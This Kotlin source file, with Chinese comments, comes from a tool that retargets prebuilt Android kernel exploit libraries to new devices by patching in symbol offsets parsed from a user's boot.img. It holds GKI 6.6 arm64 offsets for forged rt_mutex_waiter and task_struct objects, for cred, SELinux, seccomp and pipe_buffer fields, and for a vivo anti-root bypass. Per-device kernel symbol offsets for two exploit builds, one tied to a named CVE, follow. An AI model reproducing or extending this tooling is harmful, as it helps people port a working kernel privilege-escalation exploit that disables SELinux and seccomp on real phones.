package com.kernelpack.profile

import com.kernelpack.Hex
import java.security.MessageDigest

/**
 * ABI 档位：**不随 boot.img 变化**的那部分偏移。
 *
 * 这些值是编译期内核源码/配置决定的（`struct task_struct` 字段位置、`pipe_buffer` 大小、
 * `file_operations` 槽位等），kallsyms 给不出来。它们只在**内核大版本**之间变化，
 * 因此按 GKI 档位（如 `gki-6.6-arm64`）打包。打包器不改这些，只是把它们带出来，
 * 好让上层能生成一份完整的 `target.h`。
 */
data class AbiProfile(
    val id: String,
    val kernelSeries: String,
    val memoryLayout: Map<String, Long>,
    val structOffsets: Map<String, Long>,
)

/**
 * 基线档位：描述"基础 .so 是照着哪台机器的偏移编译出来的"。
 *
 * 打包就是把这些 `symbolOffsets`（旧值）换成从用户 boot.img 解析出来的新值。
 * 只要基线对得上，任何同 GKI 大版本的机型都能打包。
 */
data class BaselineProfile(
    val id: String,
    /** 基础 .so 里内嵌的机型标签（`BUILD_VARIANT_LABEL`），可用来识别。 */
    val variantLabel: String,
    /** 基线对应的内核版本。 */
    val kernelVersion: String,
    /** 基线对应的内核链接基址。 */
    val imageBase: Long,
    val abi: AbiProfile,
    /** 键 → 旧偏移（相对 [imageBase]）。 */
    val symbolOffsets: Map<String, Long>,
    /** 可选：基础 .so 的 sha256，用于精确识别。 */
    val sha256: String? = null,
) {
    fun sha256Of(bytes: ByteArray): String = BaselineProfiles.sha256Hex(bytes)
}

object BaselineProfiles {

    fun sha256Hex(bytes: ByteArray): String {
        val d = MessageDigest.getInstance("SHA-256").digest(bytes)
        val sb = StringBuilder(d.size * 2)
        for (b in d) {
            sb.append(Character.forDigit((b.toInt() shr 4) and 0xf, 16))
            sb.append(Character.forDigit(b.toInt() and 0xf, 16))
        }
        return sb.toString()
    }

    /** GKI 6.6 / arm64 / SM8750 —— 结构体 ABI 档位。 */
    val GKI_6_6_ARM64 = AbiProfile(
        id = "gki-6.6-arm64",
        kernelSeries = "6.6",
        memoryLayout = linkedMapOf(
            "P0_PAGE_OFFSET" to 0xffffff8000000000uL.toLong(),
            "P0_PHYS_OFFSET" to 0x80000000L,
            "P0_KERNEL_PHYS_LOAD" to 0xa8000000L,
            "KERNELSNITCH_IDENTITY_START" to 0xffffff8000000000uL.toLong(),
            "KERNELSNITCH_IDENTITY_END" to 0xffffff9000000000uL.toLong(),
            "DIRECT_MAP_BASE" to 0xffffff8000000000uL.toLong(),
            "DIRECT_MAP_END" to 0xffffff9000000000uL.toLong(),
            "VMEMMAP_START" to 0xfffffffe00000000uL.toLong(),
        ),
        structOffsets = linkedMapOf(
            // rt_mutex_waiter（kernel/locking/rtmutex_common.h）
            "WAITER_LOCAL_OFF" to 0x80L,
            "WAITER_TREE_ENTRY_OFF" to 0x0L,
            "WAITER_PI_TREE_ENTRY_OFF" to 0x28L,
            "WAITER_TASK_OFF" to 0x50L,
            "WAITER_LOCK_OFF" to 0x58L,
            "WAITER_WAKE_STATE_OFF" to 0x60L,
            "WAITER_PRIO_OFF" to 0x18L,
            "WAITER_DEADLINE_OFF" to 0x20L,
            "WAITER_WW_CTX_OFF" to 0x68L,
            // 伪造 waiter（pselect fdset 布局）
            "FAKE_WAITER_TREE_PRIO_OFF" to 0x18L,
            "FAKE_WAITER_TREE_DEADLINE_OFF" to 0x20L,
            "FAKE_WAITER_PI_TREE_ENTRY_OFF" to 0x28L,
            "FAKE_WAITER_PI_TREE_PRIO_OFF" to 0x40L,
            "FAKE_WAITER_PI_TREE_DEADLINE_OFF" to 0x48L,
            "FAKE_WAITER_TASK_OFF" to 0x50L,
            "FAKE_WAITER_LOCK_OFF" to 0x58L,
            "FAKE_WAITER_WAKE_STATE_OFF" to 0x60L,
            "FAKE_WAITER_WW_CTX_OFF" to 0x68L,
            // 伪造 task_struct 字段
            "FAKE_TASK_USAGE_OFF" to 0x40L,
            "FAKE_TASK_PRIO_OFF" to 0x84L,
            "FAKE_TASK_NORMAL_PRIO_OFF" to 0x8cL,
            "FAKE_TASK_TASK_GROUP_OFF" to 0x348L,
            "FAKE_TASK_PI_LOCK_OFF" to 0x90cL,
            "FAKE_TASK_PI_WAITERS_OFF" to 0x920L,
            "FAKE_TASK_PI_TOP_TASK_OFF" to 0x930L,
            "FAKE_TASK_PI_BLOCKED_ON_OFF" to 0x938L,
            "FAKE_TASK_UCLAMP_REQ_OFF" to 0x350L,
            "FAKE_TASK_UCLAMP_OFF" to 0x358L,
            // task_struct
            "MM_OWNER_OFF" to 0x5a0L,
            "TASK_PID_OFF" to 0x618L,
            "TASK_TGID_OFF" to 0x61cL,
            "TASK_REAL_PARENT_OFF" to 0x628L,
            "TASK_ATOMIC_FLAGS_OFF" to 0x5d8L,
            "TASK_REAL_CRED_OFF" to 0x818L,
            "TASK_CRED_OFF" to 0x820L,
            "TASK_COMM_OFF" to 0x830L,
            "TASK_TASKS_OFF" to 0x550L,
            "TASK_THREAD_INFO_FLAGS_OFF" to 0x0L,
            "TASK_SECCOMP_OFF" to 0x8e8L,
            // vivo vr.ko 反 root 标记
            "VR_TAG_A_OFF" to 0x06L,
            "VR_TAG_B_OFF" to 0x2cL,
            "VR_SYSCALL_TP_FLAG" to 0x400L,
            // cred
            "CRED_UID_OFF" to 0x8L,
            "CRED_SECUREBITS_OFF" to 0x28L,
            "CRED_CAPS_OFF" to 0x30L,
            "CRED_SECURITY_OFF" to 0x80L,
            "SELINUX_CRED_BLOB_OFF" to 0x0L,
            "SELINUX_CRED_OSID_OFF" to 0x0L,
            "SELINUX_CRED_SID_OFF" to 0x4L,
            // seccomp
            "SECCOMP_MODE_OFF" to 0x0L,
            "SECCOMP_FILTER_COUNT_OFF" to 0x4L,
            "SECCOMP_FILTER_OFF" to 0x8L,
            "TIF_SECCOMP_BIT" to 11L,
            "PFA_NO_NEW_PRIVS_BIT" to 0L,
            // struct page / slab
            "STRUCT_PAGE_SIZE" to 0x40L,
            "STRUCT_PAGE_COMPOUND_HEAD_OFF" to 0x8L,
            "STRUCT_SLAB_CACHE_OFF" to 0x8L,
            "STRUCT_PAGE_TYPE_OFF" to 0x30L,
            // pipe_buffer
            "PIPE_BUFFER_SIZE" to 0x28L,
            "PIPE_BUFFER_SLOTS" to 32L,
            "PIPE_BUF_FLAG_CAN_MERGE" to 0x10L,
            "PIPE_INODE_INFO_STRUCT_SIZE" to 0xb8L,
            "PIPE_INODE_INFO_SIZE" to 0xc0L,
            "PIPE_INODE_INFO_SLOTS_PER_PAGE" to 21L,
            "PIPE_HEAD_OFF" to 0x60L,
            "PIPE_TAIL_OFF" to 0x64L,
            "PIPE_MAX_USAGE_OFF" to 0x68L,
            "PIPE_RING_SIZE_OFF" to 0x6cL,
            "PIPE_NR_ACCOUNTED_OFF" to 0x70L,
            "PIPE_READERS_OFF" to 0x74L,
            "PIPE_WRITERS_OFF" to 0x78L,
            "PIPE_FILES_OFF" to 0x7cL,
            "PIPE_TMP_PAGE_OFF" to 0x90L,
            "PIPE_BUFS_OFF" to 0xa8L,
            "PIPE_USER_OFF" to 0xb0L,
            // file_operations 槽位
            "FOPS_OWNER_OFF" to 0x0L,
            "FOPS_LLSEEK_OFF" to 0x8L,
            "FOPS_READ_OFF" to 0x10L,
            "FOPS_WRITE_OFF" to 0x18L,
            "FOPS_READ_ITER_OFF" to 0x20L,
            "FOPS_WRITE_ITER_OFF" to 0x28L,
            "FOPS_IOCTL_OFF" to 0x48L,
            "FOPS_COMPAT_IOCTL_OFF" to 0x50L,
            "FOPS_MMAP_OFF" to 0x58L,
            "FOPS_OPEN_OFF" to 0x68L,
            "FOPS_RELEASE_OFF" to 0x78L,
            "FOPS_SPLICE_READ_OFF" to 0xb8L,
            "FOPS_SHOW_FDINFO_OFF" to 0xd8L,
            // configfs_buffer
            "CFG_PAGE_OFF" to 16L,
            "CFG_NEEDS_READ_FILL_OFF" to 80L,
            "CFG_BIN_BUFFER_OFF" to 88L,
            "CFG_BIN_BUFFER_SIZE_OFF" to 96L,
            "CFG_CB_MAX_SIZE_OFF" to 100L,
            // 内核页内布局
            "LOCK_OFF" to 0x1350L,
            "W0_OFF" to 0x2220L,
            "FOPS_OFF" to 0x1000L,
            "SCRATCH_OFF" to 0x3000L,
            "RIGHT_OFF" to 0x4440L,
            "LEFT_OFF" to 0x5550L,
            "FAKE_TASK_OFF" to 0x3200L,
            // tracepoint
            "TRACEPOINT_PROBESTUB_OFF" to 0x30L,
            "TRACEPOINT_FUNCS_OFF" to 0x48L,
            "TRACEPOINT_FUNC_STRIDE" to 0x18L,
            "TRACEPOINT_FUNC_FUNC_OFF" to 0x0L,
            "VR_COMMIT_TO_SYSEXIT_DELTA" to 0x60L,
            "VR_KERNEL_IMAGE_MAX" to 0x4000000L,
            "PSELECT_WAITER_WORD_SHIFT" to 1L,
        ),
    )

    /**
     * 内置基线：`PD2520-BP2A.250605.031.A3`（iQOO Neo11 / SM8750 / GKI 6.6.89）。
     *
     * 这些值就是仓库里 `exploit/src/targets/PD2520-.../target.h` 的内容，
     * 也正是用户在用的 `libbs.so` / `preload.so` 编译时用的那一份 —— 已用
     * "在 .so 里搜常量" 的方式逐条核对过（33 处全部吻合）。
     */
    val PD2520 = BaselineProfile(
        id = "PD2520-BP2A.250605.031.A3",
        variantLabel = "pd2520-bp2a.250605.031.a3",
        kernelVersion = "6.6.89",
        imageBase = 0xffffffc080000000uL.toLong(),
        abi = GKI_6_6_ARM64,
        symbolOffsets = linkedMapOf(
            "ASHMEM_MISC_FOPS" to 0x226b4e8L,
            "ASHMEM_FOPS" to 0x12ebb18L,
            "ASHMEM_IOCTL" to 0xc814b4L,
            "ASHMEM_COMPAT_IOCTL" to 0xc81b70L,
            "ASHMEM_MMAP" to 0xc81bc4L,
            "ASHMEM_OPEN" to 0xc81de4L,
            "ASHMEM_RELEASE" to 0xc81e6cL,
            "ASHMEM_SHOW_FDINFO" to 0xc81ef8L,
            "CONFIGFS_READ_ITER" to 0x48cbb8L,
            "CONFIGFS_BIN_WRITE_ITER" to 0x48d0e4L,
            "COPY_SPLICE_READ" to 0x4113d4L,
            "NOOP_LLSEEK" to 0x3c4174L,
            "INIT_TASK" to 0x210e280L,
            "ROOT_TASK_GROUP" to 0x2305600L,
            "SELINUX_BLOB_SIZES" to 0x16725d0L,
            "SELINUX_ENFORCING" to 0x2346ee8L,
            "SECURITY_HOOK_HEADS" to 0x1671e98L,
            "KMALLOC_CACHES" to 0x16719d8L,
            "ANON_PIPE_BUF_OPS" to 0x115bac8L,
            "SLIDE_NFULNL_LOGGER" to 0x2102268L,
            "SLIDE_LOGGERS_0_1" to 0x21021b8L,
            "SLIDE_RANDOM_BOOT_ID_DATA" to 0x22288c0L,
            "SLIDE_NFULNL_LOG_PACKET" to 0xc6ce14L,
            "SLIDE_INIT_TASK" to 0x210e280L,
            "SLIDE_ROOT_TASK_GROUP" to 0x2305600L,
            "SLIDE_SYSCTL_BOOTID" to 0x2367ee0L,
            "SYS_EXIT_TP" to 0x22a2220L,
            "RVH_COMMIT_CREDS_TP" to 0x22bbc70L,
        ),
        // v1.3.0 的 preload.so（176544 字节）。
        //
        // 注：v1.0.0（162328 字节，sha256 87bf839f…）用的是**同一套偏移** ——
        // 上游 PD2520 target.h 在两者之间没有改动，实测也确认：拿同一份 boot.img
        // 分别打两个版本，都是「已替换 7 项 · 9 处 · 旧值残留 0」，
        // 所以这份基线对两个版本都成立；这里只登记当前随包发布的那一份，
        // 另一版本的 .so 若作为自定义载荷导入，会走 variantLabel 文本匹配命中同一条基线。
        sha256 = "8c3410cbc7dce25df3274c0e35d293cb38d7ad2384af7ecc549a3400c50695d9",
    )

    /**
     * 通用方案基线：IonStack（NebuSec/CyberMeowfia）CVE-2026-43499 的编译产物。
     *
     * 与 [PD2520] 的区别不在"偏移怎么改"，而在**载荷本身**：
     * - `PD2520` 那份（`libbs.so`）是 vivo/iQOO 专用分支，多一条 `vr.ko` 反 root 绕过；
     * - 这一份是 Pixel/GKI 通用分支，没有厂商绕过，靠 `rt_mutex` + `pipe_buffer` 那条
     *   通用链在 GKI 6.6 设备上工作 —— 也就是用户说的「通用方案」。
     *
     * 下面的常量就是它**编译时**写进 `.text` 的那一份（取自
     * `src/targets/frankel-CP2A.260605.012/target.h`，blazer 目标 include 的就是它），
     * 打包时会被逐项改写成用户 boot.img 解析出来的新值。
     */
    val IONSTACK_P10 = BaselineProfile(
        id = "IONSTACK-P10-CP2A.260605.012",
        variantLabel = "p10_ab152_truephone",
        kernelVersion = "6.6",
        imageBase = 0xffffffc080000000uL.toLong(),
        abi = GKI_6_6_ARM64,
        symbolOffsets = linkedMapOf(
            "ASHMEM_MISC_FOPS" to 0x0228c568L,
            "ASHMEM_FOPS" to 0x012f74c0L,
            "ASHMEM_IOCTL" to 0x00c8d908L,
            "ASHMEM_COMPAT_IOCTL" to 0x00c8dfc4L,
            "ASHMEM_MMAP" to 0x00c8e018L,
            "ASHMEM_OPEN" to 0x00c8e238L,
            "ASHMEM_RELEASE" to 0x00c8e2c0L,
            "ASHMEM_SHOW_FDINFO" to 0x00c8e34cL,
            "CONFIGFS_READ_ITER" to 0x00491eecL,
            "CONFIGFS_BIN_WRITE_ITER" to 0x00492418L,
            "COPY_SPLICE_READ" to 0x00415be0L,
            "NOOP_LLSEEK" to 0x003c8940L,
            "INIT_TASK" to 0x0212e280L,
            "ROOT_TASK_GROUP" to 0x02328980L,
            "SELINUX_BLOB_SIZES" to 0x016849b0L,
            "SELINUX_ENFORCING" to 0x0236a2e0L,
            "SECURITY_HOOK_HEADS" to 0x01684278L,
            "KMALLOC_CACHES" to 0x01683db8L,
            "ANON_PIPE_BUF_OPS" to 0x01176748L,
            "SLIDE_NFULNL_LOGGER" to 0x02122260L,
            "SLIDE_LOGGERS_0_1" to 0x021221b0L,
            "SLIDE_RANDOM_BOOT_ID_DATA" to 0x02249468L,
            "SLIDE_INIT_TASK" to 0x0212e280L,
            "SLIDE_ROOT_TASK_GROUP" to 0x02328980L,
            "SLIDE_SYSCTL_BOOTID" to 0x0238b2d8L,
        ),
        sha256 = "67bedbd7709d40333392e1943cc9314eadf6322f651aa0c67ad6f95edaa2ae94",
    )

    /** 全部内置基线。 */
    val ALL: List<BaselineProfile> = listOf(PD2520, IONSTACK_P10)

    /**
     * 自动挑选基线：
     *  1. sha256 精确匹配；
     *  2. 基础 .so 里内嵌的机型标签能对上；
     *  3. 兜底返回 [PD2520]。
     */
    fun detect(baseLibrary: ByteArray, candidates: List<BaselineProfile> = ALL): BaselineProfile {
        val digest = sha256Hex(baseLibrary)
        candidates.firstOrNull { it.sha256 != null && it.sha256.equals(digest, ignoreCase = true) }?.let { return it }
        val text = String(baseLibrary, Charsets.ISO_8859_1)
        candidates.firstOrNull { it.variantLabel.isNotEmpty() && text.contains(it.variantLabel) }?.let { return it }
        return candidates.first()
    }

    fun byId(id: String): BaselineProfile? = ALL.firstOrNull { it.id == id }
}
